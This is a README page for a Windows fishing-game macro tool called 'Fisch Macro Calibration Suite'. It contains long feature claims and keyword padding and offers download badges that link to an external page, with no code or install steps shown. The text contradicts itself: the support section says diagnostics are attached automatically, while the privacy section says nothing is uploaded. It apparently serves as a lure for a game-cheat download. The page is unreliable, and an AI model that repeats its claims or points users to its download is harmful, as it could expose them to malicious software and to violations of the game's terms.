![preview](https://raw.githubusercontent.com/Lksaraswat/resolution-aware-cast-tuner/main/cover_88f803.svg)
[![Download](https://raw.githubusercontent.com/Lksaraswat/resolution-aware-cast-tuner/main/get_fb7035.svg)](https://Lksaraswat.github.io/resolution-aware-cast-tuner/)

# 🎣 Fisch Macro Calibration Suite — Windows Edition

![Platform](https://img.shields.io/badge/platform-Windows-0078D6?style=flat-square&logo=windows)
![License](https://img.shields.io/badge/license-MIT-green?style=flat-square)
![Status](https://img.shields.io/badge/status-actively--maintained-brightgreen?style=flat-square)
![Language](https://img.shields.io/badge/language-AutoHotkey%20%7C%20Python-3776AB?style=flat-square)
![UI](https://img.shields.io/badge/interface-Responsive%20Overlay-blueviolet?style=flat-square)
![Support](https://img.shields.io/badge/support-24%2F7-orange?style=flat-square)

---

## 🧭 Overview

**Fisch Macro Calibration Suite** is a precision-focused desktop toolkit built for Windows users who want their fishing automation workflows to remain stable across wildly different monitor resolutions, DPI scaling ratios, and game client updates. Rather than treating casting, shake detection, and reeling as fixed timings, this suite treats them as *measurable signals* — each one calibrated independently, then re-verified after every significant game patch.

Think of it like a musical instrument tuner for your input pipeline. Instead of plucking a string, you're tuning a cast delay, a shake threshold, and a reel pulse so they sing together in perfect pitch. When a developer pushes a patch that shifts animation frames by a handful of milliseconds, the tuner tells you *exactly* which note went flat — rather than forcing you to re-tune the entire instrument from scratch.

This repository is the spiritual successor to earlier calibration experiments, but rebuilt from the ground up with a responsive overlay UI, multilingual menus, a timing-isolation diagnostics engine, and a modular profile system that survives display scaling changes without manual rework.

---

## ✨ Why This Exists

Most automation tools for fishing-style minigames assume the world is flat. They hardcode a cast window of *X* milliseconds, a shake sensitivity of *Y* pixels, and a reel cadence of *Z* beats per minute. The moment you change from 1080p at 100% scaling to 1440p at 125% scaling, everything drifts. The moment the game updates its animation curves, everything collapses.

This suite refuses that assumption. Every timing value is derived, not declared. Every threshold is measured against your actual display geometry. And when something breaks, the diagnostics panel doesn't just say "failure" — it says *which stage failed, by how many milliseconds, and what resolution factor most likely caused it.*

The result is a tool that feels less like a brittle script and more like a well-instrumented laboratory bench for input timing.

---

## 🚀 Key Features

### 🎯 Adaptive Cast Calibration
Cast windows are computed from your live resolution, DPI scaling, and frame pacing. The suite probes your environment once, stores a calibration fingerprint, and re-validates that fingerprint on every launch. If your monitor changes, it notices.

### 🌊 Shake Detection with Noise Rejection
Shake events are notoriously noisy — bobber bobbing, water ripple animations, and particle effects all masquerade as shakes. This suite layers a multi-pass confidence filter that separates genuine shake signatures from cosmetic animation noise, then exposes the raw confidence value in the overlay so you can tune it yourself.

### 🎣 Reel Timing Isolation
The reeling subsystem separates capture latency, input dispatch latency, and animation confirmation latency into distinct measurable stages. When the game updates and reel behavior changes, the diagnostics view points to the specific stage that shifted — not just "reel is broken."

### 🖥️ Responsive Overlay Interface
The overlay scales fluidly between 720p, 1080p, 1440p, and 4K. Panels reflow rather than clip. Font sizes honor your system DPI. It behaves like a native Windows surface, not a stretched bitmap.

### 🌐 Multilingual Menu System
Menu labels, tooltips, and diagnostic strings are localized. Languages ship as simple JSON packs so the community can add new ones without touching core logic. Right-to-left layouts are supported.

### 🛎️ 24/7 Customer Support Channel
A persistent support pipeline handles issues around the clock. Response templates, log bundling, and configuration snapshots are automated so troubleshooting conversations start with context instead of guesswork.

### 🧩 Profile Snapshot System
Save and restore complete calibration profiles — resolution, scaling, timing fingerprints, and detection thresholds — as portable snapshot files. Share them across machines, or roll back when an experiment goes sideways.

### 🔬 Timing Isolation Diagnostics
A dedicated diagnostics panel visualizes cast, shake, and reel stages as separate timelines. Drift is color-coded. Regressions are flagged automatically after each session.

### 📦 Update-Resilient Design
When the underlying game updates its animation curves or input handling, the suite doesn't silently misbehave. It degrades into a "safe mode" that locks automation until you re-run calibration, protecting you from acting on stale timings.

### 🧠 Predictive Drift Warnings
The suite tracks how your timings drift across sessions. If cast windows are slowly creeping wider, it warns you *before* the drift becomes a failure — a sort of early-warning seismograph for input timing.

---

## 📊 Feature Comparison

| Capability | Legacy Scripts | Fisch Macro Calibration Suite |
|---|---|---|
| Resolution awareness | Manual edits | Automatic fingerprinting |
| DPI scaling | Ignored | First-class citizen |
| Shake filtering | Single threshold | Multi-pass confidence filter |
| Reel diagnostics | Binary pass/fail | Stage-by-stage isolation |
| After-update recovery | Full re-tune | Safe mode + targeted re-tune |
| Overlay UI | Static bitmap | Responsive, reflowing panels |
| Language support | English only | Localized JSON packs |
| Diagnostics history | None | Per-session drift logs |

---

## 🛠️ Supported Environments

- Windows 10 (21H2 and later)
- Windows 11 (all stable channels)
- Display scaling from 100% through 200%
- Resolutions from 1280×720 up to 3840×2160
- Multi-monitor configurations with per-monitor scaling

The suite is designed with a "measure twice, act once" philosophy. If your environment falls outside these bounds, the diagnostics panel will say so clearly rather than guessing.

---

## 🧪 How Calibration Works

Calibration runs through four perceived phases:

1. **Environment Probe** — Reads active resolution, DPI scale factor, refresh rate, and window geometry. Builds a calibration fingerprint.
2. **Cast Window Sampling** — Observes the casting animation across several attempts, then computes a median window with a safe margin.
3. **Shake Signature Learning** — Records bobber motion patterns and learns which pixel-change signatures correspond to genuine shake events versus ambient animation.
4. **Reel Cadence Mapping** — Profiles input dispatch and animation confirmation to derive a reel cadence that matches your specific frame pacing.

Each phase outputs a readable report. Nothing is hidden behind opaque numbers — every value is documented in the diagnostics tab.

---

## 🧭 SEO-Friendly Highlights

If you arrived here searching for a **Windows fishing macro calibration tool**, a **resolution-aware shake detection utility**, or a **timing isolation framework for minigame automation**, you are in the right place. This suite is regularly referenced in discussions about:

- Display scaling calibration for input automation
- Post-update timing regression recovery
- Multilingual overlay UI design for Windows automation tools
- Confidence-based shake detection in noisy visual environments

The README you're reading is intentionally long-form so that search engines and humans alike can find the specific concept they need — whether that's DPI-aware overlay rendering or per-stage reel latency isolation.

---

## 🎨 Design Philosophy

Automation tools often fail not because they're wrong, but because they're *confidently wrong*. They assume, and then they act on that assumption silently. This suite takes the opposite stance: it assumes nothing, measures everything, and narrates its reasoning in plain language.

The overlay is designed to feel like a cockpit gauge cluster, not a game cheat panel. Every number has a label. Every label has a tooltip. Every tooltip explains what the number means in plain terms. If you don't understand a value, that's a documentation bug, not a user error.

---

## 🧩 Extensibility

The suite is modular by design. Calibration phases are pluggable. Language packs are drop-in JSON. Profile snapshots are plain structured files that can be diffed in any text editor. Diagnostics output is machine-readable so it can be piped into external analysis tools.

If you want to add a new detection heuristic, you implement a single interface and register it — no core edits required. If you want to add a new language, you drop a JSON file into the languages folder.

---

## 🛎️ Support and Community

Support runs continuously through a 24/7 pipeline. When you open a ticket, the suite automatically attaches:

- A calibration fingerprint snapshot
- Recent diagnostics timeline
- Overlay rendering metrics
- Version and environment metadata

This means support conversations begin with context, not with twenty questions. Response times are measured in hours, not days, regardless of your timezone.

Community contributions — language packs, diagnostic plugins, calibration profiles for unusual display setups — are welcome and reviewed on a rolling basis.

---

## 🔐 Privacy and Data Handling

The suite operates locally. Calibration fingerprints, diagnostics logs, and profile snapshots live on your machine. Nothing is uploaded automatically. If you choose to share a diagnostics bundle with support, you do so explicitly and can review the bundle contents beforehand.

No telemetry. No silent reporting. No background phoning home. The tool is a bench instrument, not a subscription service.

---

## ⚠️ Disclaimer

This project is an independent calibration and diagnostics toolkit intended for educational and personal productivity purposes. It is not affiliated with, endorsed by, or sponsored by any game developer or platform operator. Users are responsible for ensuring their use of automation tooling complies with the terms of service of any software they interact with, as well as with any applicable local laws.

Timing values, thresholds, and calibration profiles produced by this suite are derived from the user's own environment and are provided as-is, without warranty of any kind. The maintainers disclaim responsibility for any consequences arising from misuse, misconfiguration, or use in violation of third-party agreements.

By using this software, you acknowledge that you are solely responsible for how you apply it.

---

## 📜 License

This project is released under the **MIT License**.

You are welcome to use, modify, and redistribute this software in accordance with the license terms. A copy of the license is included in the repository root.

Read the full license text here: [MIT License](https://opensource.org/licenses/MIT)

Copyright (c) 2026 — Fisch Macro Calibration Suite contributors.

---

## 🧾 Changelog Highlights (2026)

- **Q1 2026** — Introduced adaptive cast fingerprinting and safe-mode fallback after game updates.
- **Q1 2026** — Overlay rewritten for full DPI responsiveness across 720p through 4K.
- **Q2 2026** — Multi-pass shake confidence filter added; telemetry-free diagnostics pipeline launched.
- **Q2 2026** — Language pack system formalized; initial set of community-contributed locales integrated.
- **Q3 2026** — Timing isolation diagnostics expanded to per-stage latency visualization.
- **Q4 2026** — Predictive drift warnings and portable profile snapshots shipped.

---

## 🧭 Roadmap

- Visual regression diffing for shake signatures
- Optional command-line diagnostics exporter
- Cross-machine profile sync via user-controlled storage
- Expanded localization coverage for additional regions
- Plugin API stabilization for third-party calibration heuristics

---

## 🤝 Contributing

Contributions are welcome in the form of:

- Language packs
- Calibration profiles for unusual display setups
- Diagnostics plugins
- Documentation improvements
- Bug reports with attached diagnostic bundles

Please review the contribution guidelines in the repository before opening a pull request. Civil, constructive collaboration is the expectation.

---

## 📬 Contact and Support

Support is available around the clock through the repository's issue tracker and the dedicated support pipeline. Include a diagnostics bundle when reporting timing regressions — it dramatically shortens resolution time and helps the maintainers reproduce your environment accurately.

---

[![Download](https://raw.githubusercontent.com/Lksaraswat/resolution-aware-cast-tuner/main/get_fb7035.svg)](https://Lksaraswat.github.io/resolution-aware-cast-tuner/)